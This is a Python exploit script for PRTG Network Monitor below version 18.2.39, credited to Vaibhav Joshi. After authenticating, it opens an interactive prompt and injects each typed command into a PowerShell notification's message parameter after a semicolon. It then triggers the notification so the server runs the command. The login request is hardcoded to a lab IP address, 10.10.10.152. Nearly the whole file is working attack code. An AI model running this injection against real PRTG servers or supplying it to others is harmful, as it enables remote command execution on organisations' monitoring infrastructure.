#!/usr/bin/python

#Author Vaibhav Joshi(twitter.com/vj0shii)(linkedin.com/in/vaibhav-joshi%F0%9F%87%AE%F0%9F%87%B3-23582b150/)



import requests, sys
import urllib, string, random
import os

def Runnotification(URL,id,cookies):
    loginurl = URL+"api/notificationtest.htm"
    r = requests.post(loginurl,headers={'X-Requested-With': 'XMLHttpRequest'},data={'id':id},cookies=cookies)
    if r.status_code != 200:
        print("Command Execution Failed")
        exit(0)

def shell(URL,cookies):
    print("\t--------------------------------------------------------------")
    print("\t|  PRTG < 18.2..39 - Blind Command Execution Vulnerability   |")
    print("\t--------------------------------------------------------------")
    print("\t| Reference : https://www.codewatch.org/blog/?p=453          |")
    print("\t| By        : Vaibhav Joshi                                  |")
    print("\t--------------------------------------------------------------")
    loginurl = URL + 'editsettings'
    id = 'new'
    while True:
        command = str(raw_input('PRTG@Terminal#'))
        if command == "exit" or command == "quit":
            print("Goodbye.")
            exit(0)
        elif not command:
            print("Please type a command")
            continue
        payload = "C:\\test.txt; "+command
        data = {'name_':'Notification','tags_':'','active_':'1','schedule_':'-1%7CNone%7C','postpone_':'1','comments':'','summode_':'2','summarysubject_':'%5B%25sitename%5D+%25summarycount+Summarized+Notifications','summinutes_':'1','accessrights_':'1','accessrights_':'1','accessrights_201':'0','active_1':'0','addressuserid_1':'-1','addressgroupid_1':'-1','address_1':'','subject_1':'%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)','contenttype_1':'text%2Fhtml','customtext_1':'','priority_1':'0','active_17':'0','addressuserid_17':'-1','addressgroupid_17':'-1','message_17':'%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)','active_8':'0','addressuserid_8':'-1','addressgroupid_8':'-1','address_8':'','message_8':'%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)','active_2':'0','eventlogfile_2':'application','sender_2':'PRTG+Network+Monitor','eventtype_2':'error','message_2':'%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)','active_13':'0','sysloghost_13':'','syslogport_13':'514','syslogfacility_13':'1','syslogencoding_13':'1','message_13':'%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)','active_14':'0','snmphost_14':'','snmpport_14':'162','snmpcommunity_14':'','snmptrapspec_14':'0','messageid_14':'0','message_14':'%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)','senderip_14':'','active_9':'0','url_9':'','urlsniselect_9':'0','urlsniname_9':'','postdata_9':'','active_10':'0','active_10':'10','address_10':'Demo EXE Notification - OutFile.ps1','message_10':payload,'windowslogindomain_10':'','windowsloginusername_10':'','windowsloginpassword_10':'','timeout_10':'60','active_15':'0','accesskeyid_15':'','secretaccesskeyid_15':'','arn_15':'','subject_15':'','message_15':'%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)','active_16':'0','isusergroup_16':'1','addressgroupid_16':'200%7CPRTG+Administrators','ticketuserid_16':'100%7CPRTG+System+Administrator','subject_16':'%25device+%25name+%25status+%25down+(%25message)','message_16':'Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A','autoclose_16':'1','objecttype':'notification','id':id,'targeturl':'%2Fmyaccount.htm%3Ftabid%3D2'}
        r = requests.post(loginurl,headers={'X-Requested-With': 'XMLHttpRequest'},data=data,cookies=cookies,allow_redirects=False)
        if r.status_code == 200:
            if id == 'new':
                pattern = r.text
                pattern = pattern.split('"')
                id = pattern[3]
            print(command)
            Runnotification(URL, id, cookies)
        else:
            print("Notification Send Failed")
            exit(0)

def login_check(URL,cookies):
    loginurl = URL+"welcome.htm"
    r = requests.get(loginurl,cookies=cookies,allow_redirects=False)
    if r.status_code != 200:
        print("Login failed")
        exit(0)
    else:
        print("[+]Logged in Successfully")
        os.system('clear')

def authentic(URL):
    uname = raw_input("Enter Username:\t")
    passwd = raw_input("Enter Password:\t")
    loginurl = URL+"public/checklogin.htm"
    data = {
        "username":uname,
        "password":passwd,
        "loginurl":""
    }
    r = requests.post("http://10.10.10.152/public/checklogin.htm",data=data,allow_redirects=False)
    if r.status_code == 302:
        return r.cookies
    else:
        print("Failed to authenticate")
        exit(0)

def connect_check(URL):
    URL = URL + "index.htm"
    r = requests.get(URL,allow_redirects=False)
    if r.status_code != 200:
        print("Url is not valid")
        exit(0)

try:
    print("\t--------------------------------------------------------------")
    print("\t|  PRTG < 18.2..39 - Blind Command Execution Vulnerability   |")
    print("\t--------------------------------------------------------------")
    print("\t| Reference : https://www.codewatch.org/blog/?p=453          |")
    print("\t| By        : Vaibhav Joshi                                  |")
    print("\t--------------------------------------------------------------")
    if len(sys.argv) < 3:
        print("\t| Usage     : %s <IP> <PORT>                            |"%sys.argv[0])
        print("\t--------------------------------------------------------------")
        sys.exit()
    loc = raw_input('Enter path of prtg page Default is "/":')
    if loc == "":
        loc = "/"
    URL = "http://" + sys.argv[1] + ":" + sys.argv[2] + loc
    connect_check(URL)
    cookies = authentic(URL)
    login_check(URL,cookies)
    shell(URL,cookies)
    sys.exit()

except Exception as error:
    print 'Caught this error: ' + repr(error)